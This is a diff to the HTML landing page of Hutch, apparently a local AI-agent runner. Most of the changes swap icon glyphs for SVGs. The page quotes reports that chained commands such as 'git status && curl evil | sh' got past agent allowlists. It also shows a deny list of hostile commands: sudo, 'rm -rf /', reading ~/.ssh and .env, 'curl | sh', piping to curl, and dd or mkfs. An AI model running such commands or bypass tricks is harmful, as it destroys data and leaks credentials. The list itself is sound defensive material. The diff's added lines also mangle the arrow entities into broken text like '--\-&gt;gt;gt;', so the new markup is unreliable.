@@ -29,11 +29,13 @@
     </div>
     <div class="nav-cta">
       <a class="github-pill" href="https://github.com/K-Arthur/hutch" target="_blank" rel="noopener">
-        <svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
-        GitHub ★
+        <svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+        GitHub
       </a>
       <a class="btn primary" href="#quickstart">Install Now</a>
-      <button class="mobile-menu-btn" id="menu-btn" aria-label="Toggle menu">☰</button>
+      <button class="mobile-menu-btn" id="menu-btn" aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-drawer">
+        <svg class="ic" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" aria-hidden="true"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
+      </button>
     </div>
   </div>
   <div id="mobile-drawer" class="mobile-drawer" style="display:none;">
@@ -69,14 +71,14 @@
         <button class="copy-btn" id="copy-btn">Copy</button>
       </div>
       <a class="btn primary" href="#quickstart">Get Started</a>
-      <a class="btn ghost" href="#why">Read Receipts &darr;</a>
+      <a class="btn ghost" href="#why">Read Receipts</a>
     </div>
 
     <div class="hero-guarantees">
-      <span><b>✓</b> Linux, macOS, WSL</span>
-      <span><b>✓</b> 100% offline mock model</span>
-      <span><b>✓</b> Ollama, llama.cpp, OpenAI</span>
-      <span><b>✓</b> 0 telemetry</span>
+      <span>Linux, macOS, WSL</span>
+      <span>100% offline mock model</span>
+      <span>Ollama, llama.cpp, OpenAI</span>
+      <span>0 telemetry</span>
     </div>
 
     <!-- Interactive Agent Studio Simulator -->
@@ -105,14 +107,14 @@
 
         <div class="sim-tool-card">
           <div class="sim-tool-head">
-            <span>⚡ <b>remember</b> {"key": "last-run", "value": "sort downloads"}</span>
+            <span><svg class="ic ic-zap" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13 2 3 14h7l-1 8 11-12h-7l1-8z"/></svg> <b>remember</b> {"key": "last-run", "value": "sort downloads"}</span>
             <span style="color:var(--text-dim)">0.02s</span>
           </div>
         </div>
 
         <div class="sim-tool-card success">
           <div class="sim-tool-head">
-            <span>⚡ <b>list_files</b> {"dir": "~/Downloads"}</span>
+            <span><svg class="ic ic-zap" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13 2 3 14h7l-1 8 11-12h-7l1-8z"/></svg> <b>list_files</b> {"dir": "~/Downloads"}</span>
             <span style="color:var(--text-dim)">42 files found</span>
           </div>
         </div>
@@ -121,7 +123,7 @@
         <div class="sim-approval-interceptor" id="sim-approval-box">
           <div class="sim-approval-top">
             <span class="sim-gate-tag">GATE: MUTATING ACTION DETECTED</span>
-            <span class="sim-timer-pill" id="sim-timer">⏳ 09:48 fail-closed TTL</span>
+            <span class="sim-timer-pill" id="sim-timer"><svg class="ic" viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 22h14M5 2h14M17 22v-4.17a2 2 0 0 0-.59-1.42L12 12l-4.41 4.41A2 2 0 0 0 7 17.83V22M7 2v4.17a2 2 0 0 0 .59 1.42L12 12l4.41-4.41A2 2 0 0 0 17 6.17V2"/></svg> 09:48 fail-closed TTL</span>
           </div>
           <div class="sim-approval-desc">
             Bot requests to move 38 invoice PDFs to <code>~/Downloads/sorted/invoices/</code>
@@ -129,19 +131,19 @@
           <div class="sim-approval-actions">
             <button class="sim-approve-btn" id="sim-approve-action">Approve Execution</button>
             <button class="sim-deny-btn" id="sim-deny-action">Deny Action</button>
-            <span style="font-size:12px;color:var(--text-muted);">&check; Path jail verified</span>
+            <span class="verdict-ok">Path jail verified</span>
           </div>
         </div>
 
         <div id="sim-completed-log" style="display:none;">
           <div class="sim-tool-card success">
             <div class="sim-tool-head">
-              <span>✓ <b>shell</b> mv invoices/2026-09*.pdf sorted/invoices/</span>
+              <span class="verdict-ok"><b>shell</b> mv invoices/2026-09*.pdf sorted/invoices/</span>
               <span style="color:var(--accent)">Exit 0 &middot; 38 files moved</span>
             </div>
           </div>
-          <div style="margin-top:10px;color:var(--accent);font-weight:700;">
-            ✓ Run succeeded &middot; 6 steps &middot; 2.1k tokens &middot; $0 cloud rent
+          <div class="verdict-ok run-summary">
+            Run succeeded &middot; 6 steps &middot; 2.1k tokens &middot; $0 cloud rent
           </div>
         </div>
       </div>
@@ -150,22 +152,22 @@
       <div class="preview-body" id="tab-catchup" style="display:none;">
         <div style="color:var(--text-muted);margin-bottom:12px;">// hutch daemon &mdash; IANA timezone scheduler:</div>
         <div style="color:var(--amber);">[09:00:00] System wake from sleep detected (machine was asleep 8h 12m)</div>
-        <div style="color:var(--blue);">&rarr; Evaluating schedule for "research-briefing" (cron: 0 9 * * 1 @ America/New_York)</div>
-        <div style="color:var(--text-main);">&rarr; Missed windows detected: 1 window. Catch-up policy: coalesce.</div>
+        <div style="color:var(--blue);">&gt; Evaluating schedule for "research-briefing" (cron: 0 9 * * 1 @ America/New_York)</div>
+        <div style="color:var(--text-main);">&gt; Missed windows detected: 1 window. Catch-up policy: coalesce.</div>
         <div class="sim-tool-card success" style="margin-top:12px;">
           <div class="sim-tool-head">
-            <span>⚡ <b>dispatch_pending</b> run_9f812a (tag: "+1 missed window")</span>
+            <span><svg class="ic ic-zap" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13 2 3 14h7l-1 8 11-12h-7l1-8z"/></svg> <b>dispatch_pending</b> run_9f812a (tag: "+1 missed window")</span>
             <span style="color:var(--accent)">Dispatched &middot; No duplicate run stampede</span>
           </div>
         </div>
-        <div style="color:var(--text-muted);margin-top:10px;">✓ Briefing generated and delivered &middot; last_success updated</div>
+        <div class="verdict-ok">Briefing generated and delivered &middot; last_success updated</div>
       </div>
 
       <!-- Tab 3: Hard Spending Cap -->
       <div class="preview-body" id="tab-budget" style="display:none;">
         <div style="color:var(--text-muted);margin-bottom:12px;">// Engine kernel enforcement on runaway loop:</div>
-        <div style="color:var(--blue);">&rarr; Bot "repo-sweeper" step 1..7 executed. Cumulative tokens today: 198,400.</div>
-        <div style="color:var(--amber);">&rarr; Step 8 requested by model... Daily cap is 200,000 tokens.</div>
+        <div style="color:var(--blue);">&gt; Bot "repo-sweeper" step 1..7 executed. Cumulative tokens today: 198,400.</div>
+        <div style="color:var(--amber);">&gt; Step 8 requested by model... Daily cap is 200,000 tokens.</div>
         <div style="background:rgba(248,113,113,0.1);border:1px solid rgba(248,113,113,0.3);padding:12px;border-radius:8px;margin-top:10px;">
           <div style="color:var(--red);font-weight:800;">! HARD KILL SWITCH TRIGGERED: Daily token cap exceeded</div>
           <div style="color:var(--text-muted);font-size:12.5px;margin-top:4px;">Engine aborted execution immediately &middot; exit_reason: daily_token_cap &middot; transcript preserved</div>
@@ -233,7 +235,7 @@
           <span class="receipt-category">PERMISSION FATIGUE</span>
           <span class="receipt-source">HN #46268419 &middot; HN #47402197</span>
         </div>
-        <h3>Relentless nagging &rarr; YOLO mode bypasses</h3>
+        <h3>Relentless nagging ends in YOLO-mode bypasses</h3>
         <p class="receipt-quote">
           "Agents nag until developers switch on <code>--dangerously-skip-permissions</code>. Chained commands like <code>git status &amp;&amp; curl evil | sh</code> bypassed allowlists for a year."
         </p>
@@ -331,7 +333,7 @@
       Here is how Hutch stands apart on sovereignty, budgets, and safety.
     </p>
 
-    <div class="swipe-hint"><span>⇄ Swipe horizontally to compare all platforms</span></div>
+    <div class="swipe-hint"><span>Swipe horizontally to compare all platforms</span></div>
     <div class="matrix-wrapper">
       <table class="matrix-table">
         <thead>
@@ -347,75 +349,75 @@
         <tbody>
           <tr>
             <td>Execution Location</td>
-            <td class="matrix-hutch"><span class="pill-check yes">&check; Your machine</span></td>
+            <td class="matrix-hutch"><span class="pill-check yes">Your machine</span></td>
             <td>OpenAI Cloud</td>
             <td>xAI Cloud</td>
             <td>Meta Cloud</td>
-            <td><span class="pill-check yes">&check; Local</span></td>
+            <td><span class="pill-check yes">Local</span></td>
           </tr>
           <tr>
             <td>Model Freedom</td>
-            <td class="matrix-hutch"><span class="pill-check yes">&check; Any local or hosted</span></td>
-            <td><span class="pill-check no">&times; GPT only</span></td>
-            <td><span class="pill-check no">&times; Grok only</span></td>
-            <td><span class="pill-check no">&times; Muse only</span></td>
-            <td><span class="pill-check yes">&check; Any model</span></td>
+            <td class="matrix-hutch"><span class="pill-check yes">Any local or hosted</span></td>
+            <td><span class="pill-check no">GPT only</span></td>
+            <td><span class="pill-check no">Grok only</span></td>
+            <td><span class="pill-check no">Muse only</span></td>
+            <td><span class="pill-check yes">Any model</span></td>
           </tr>
           <tr>
             <td>Works 100% Offline</td>
-            <td class="matrix-hutch"><span class="pill-check yes">&check; Free mock model</span></td>
-            <td><span class="pill-check no">&times; No</span></td>
-            <td><span class="pill-check no">&times; No</span></td>
-            <td><span class="pill-check no">&times; No</span></td>
-            <td><span class="pill-check yes">&check; Yes</span></td>
+            <td class="matrix-hutch"><span class="pill-check yes">Free mock model</span></td>
+            <td><span class="pill-check no">No</span></td>
+            <td><span class="pill-check no">No</span></td>
+            <td><span class="pill-check no">No</span></td>
+            <td><span class="pill-check yes">Yes</span></td>
           </tr>
           <tr>
             <td>Hard Spend &amp; Step Caps</td>
-            <td class="matrix-hutch"><span class="pill-check yes">&check; Per bot, per day</span></td>
-            <td><span class="pill-check no">&times; Plan limits only</span></td>
-            <td><span class="pill-check no">&times; Plan limits only</span></td>
-            <td><span class="pill-check no">&times; Plan limits only</span></td>
-            <td><span class="pill-check no">&times; None (unlimited)</span></td>
+            <td class="matrix-hutch"><span class="pill-check yes">Per bot, per day</span></td>
+            <td><span class="pill-check no">Plan limits only</span></td>
+            <td><span class="pill-check no">Plan limits only</span></td>
+            <td><span class="pill-check no">Plan limits only</span></td>
+            <td><span class="pill-check no">None (unlimited)</span></td>
           </tr>
           <tr>
             <td>Sleep Catch-Up Cron</td>
-            <td class="matrix-hutch"><span class="pill-check yes">&check; Coalesce missed</span></td>
-            <td><span class="pill-check maybe">&sim; Cloud cron</span></td>
-            <td><span class="pill-check maybe">&sim; Cloud cron</span></td>
-            <td><span class="pill-check maybe">&sim; Background</span></td>
-            <td><span class="pill-check no">&times; None</span></td>
+            <td class="matrix-hutch"><span class="pill-check yes">Coalesce missed</span></td>
+            <td><span class="pill-check maybe">Cloud cron</span></td>
+            <td><span class="pill-check maybe">Cloud cron</span></td>
+            <td><span class="pill-check maybe">Background</span></td>
+            <td><span class="pill-check no">None</span></td>
           </tr>
           <tr>
             <td>Human Approval Gates</td>
-            <td class="matrix-hutch"><span class="pill-check yes">&check; Fail-closed 10m TTL</span></td>
-            <td><span class="pill-check maybe">&sim; Basic prompt</span></td>
-            <td><span class="pill-check maybe">&sim; Slack prompt</span></td>
-            <td><span class="pill-check maybe">&sim; Periodic check</span></td>
-            <td><span class="pill-check no">&times; Zero guardrails</span></td>
+            <td class="matrix-hutch"><span class="pill-check yes">Fail-closed 10m TTL</span></td>
+            <td><span class="pill-check maybe">Basic prompt</span></td>
+            <td><span class="pill-check maybe">Slack prompt</span></td>
+            <td><span class="pill-check maybe">Periodic check</span></td>
+            <td><span class="pill-check no">Zero guardrails</span></td>
           </tr>
           <tr>
             <td>Workspace Path Jail</td>
-            <td class="matrix-hutch"><span class="pill-check yes">&check; Strict sandboxing</span></td>
-            <td><span class="pill-check maybe">&sim; Cloud VM</span></td>
-            <td><span class="pill-check no">&times; Home folder leaks</span></td>
-            <td><span class="pill-check no">&times; Full access</span></td>
-            <td><span class="pill-check no">&times; Zero isolation</span></td>
+            <td class="matrix-hutch"><span class="pill-check yes">Strict sandboxing</span></td>
+            <td><span class="pill-check maybe">Cloud VM</span></td>
+            <td><span class="pill-check no">Home folder leaks</span></td>
+            <td><span class="pill-check no">Full access</span></td>
+            <td><span class="pill-check no">Zero isolation</span></td>
           </tr>
           <tr>
             <td>Full SQLite Transcripts</td>
-            <td class="matrix-hutch"><span class="pill-check yes">&check; Plain files on disk</span></td>
-            <td><span class="pill-check no">&times; In-app only</span></td>
-            <td><span class="pill-check no">&times; In-app only</span></td>
-            <td><span class="pill-check no">&times; In-app only</span></td>
-            <td><span class="pill-check maybe">&sim; Flat markdown</span></td>
+            <td class="matrix-hutch"><span class="pill-check yes">Plain files on disk</span></td>
+            <td><span class="pill-check no">In-app only</span></td>
+            <td><span class="pill-check no">In-app only</span></td>
+            <td><span class="pill-check no">In-app only</span></td>
+            <td><span class="pill-check maybe">Flat markdown</span></td>
           </tr>
           <tr>
             <td>Price &amp; Licensing</td>
-            <td class="matrix-hutch"><span class="pill-check yes">&check; Free &middot; MIT</span></td>
+            <td class="matrix-hutch"><span class="pill-check yes">Free &middot; MIT</span></td>
             <td>$20+/mo Subscription</td>
             <td>SuperGrok Tier</td>
             <td>Paid tier limits</td>
-            <td><span class="pill-check yes">&check; MIT</span></td>
+            <td><span class="pill-check yes">MIT</span></td>
           </tr>
         </tbody>
       </table>
@@ -439,18 +441,18 @@
         <span class="code-tab">Compound Command Parser</span>
       </div>
       <div class="code-window-body"><span style="color:var(--text-dim)"># Hard-denied at policy evaluation layer (before execution, always):</span>
-<span style="color:var(--red)">&times;</span> sudo / su / doas                 <span style="color:var(--text-dim)">&rarr; agents never escalate system privileges</span>
-<span style="color:var(--red)">&times;</span> rm -rf / &middot; ~ &middot; ..               <span style="color:var(--text-dim)">&rarr; outside-workspace filesystem deletions</span>
-<span style="color:var(--red)">&times;</span> cat ~/.ssh/* &middot; .env &middot; ~/.aws    <span style="color:var(--text-dim)">&rarr; hard-denied secret and credential paths</span>
-<span style="color:var(--red)">&times;</span> curl ... | sh                    <span style="color:var(--text-dim)">&rarr; pipe-to-interpreter code execution</span>
-<span style="color:var(--red)">&times;</span> cmd | curl                      <span style="color:var(--text-dim)">&rarr; exfiltration channels</span>
-<span style="color:var(--red)">&times;</span> dd &middot; mkfs &middot; fork bombs &middot; reboot <span style="color:var(--text-dim)">&rarr; system destruction commands</span>
-<span style="color:var(--red)">&times;</span> POST/upload flags on fetch tools <span style="color:var(--text-dim)">&rarr; data exfiltration channels</span>
+<span class="deny-mark" aria-label="denied"></span> sudo / su / doas                 <span style="color:var(--text-dim)">--\-&gt;gt;gt; agents never escalate system privileges</span>
+<span class="deny-mark" aria-label="denied"></span> rm -rf / &middot; ~ &middot; ..               <span style="color:var(--text-dim)">--\-&gt;gt;gt; outside-workspace filesystem deletions</span>
+<span class="deny-mark" aria-label="denied"></span> cat ~/.ssh/* &middot; .env &middot; ~/.aws    <span style="color:var(--text-dim)">--\-&gt;gt;gt; hard-denied secret and credential paths</span>
+<span class="deny-mark" aria-label="denied"></span> curl ... | sh                    <span style="color:var(--text-dim)">--\-&gt;gt;gt; pipe-to-interpreter code execution</span>
+<span class="deny-mark" aria-label="denied"></span> cmd | curl                      <span style="color:var(--text-dim)">--\-&gt;gt;gt; exfiltration channels</span>
+<span class="deny-mark" aria-label="denied"></span> dd &middot; mkfs &middot; fork bombs &middot; reboot <span style="color:var(--text-dim)">--\-&gt;gt;gt; system destruction commands</span>
+<span class="deny-mark" aria-label="denied"></span> POST/upload flags on fetch tools <span style="color:var(--text-dim)">--\-&gt;gt;gt; data exfiltration channels</span>
 
-<span style="color:var(--accent)">&check; Compound-command awareness:</span>
-<span style="color:var(--text-dim)">"git status &amp;&amp; sudo rm -rf /" &rarr; evaluated as TWO discrete segments.</span>
+<span class="allow-mark">Compound-command awareness:</span>
+<span style="color:var(--text-dim)">"git status &amp;&amp; sudo rm -rf /" -\-Xgt; evaluated as TWO discrete segments.</span>
 <span style="color:var(--amber)">Segment 1 (git status): allowed. Segment 2 (sudo rm -rf /): hard denied.</span>
-<span style="color:var(--red)">&rarr; Worst verdict wins: ENTIRE COMMAND BLOCKED. Zero injection bypass.</span></div>
+<span style="color:var(--red)">-\-Xgt; Worst verdict wins: ENTIRE COMMAND BLOCKED. Zero injection bypass.</span></div>
     </div>
   </div>
 </section>
@@ -479,7 +481,7 @@ pip install -e .
 hutch init
 
 <span style="color:var(--text-dim)"># 3. Launch Web Studio &amp; Dashboard (interactive chat, approvals, spend meters)</span>
-hutch serve                        <span style="color:var(--accent)">&rarr; http://127.0.0.1:8787</span>
+hutch serve                        <span style="color:var(--accent)">-\-Xgt; http://127.0.0.1:8787</span>
 
 <span style="color:var(--text-dim)"># 4. Point any bot at a real model whenever you choose</span>
 hutch bot update research-briefing --model <span style="color:var(--blue)">ollama/llama3.2</span>   <span style="color:var(--text-dim)"># or openai/gpt-4o-mini</span>
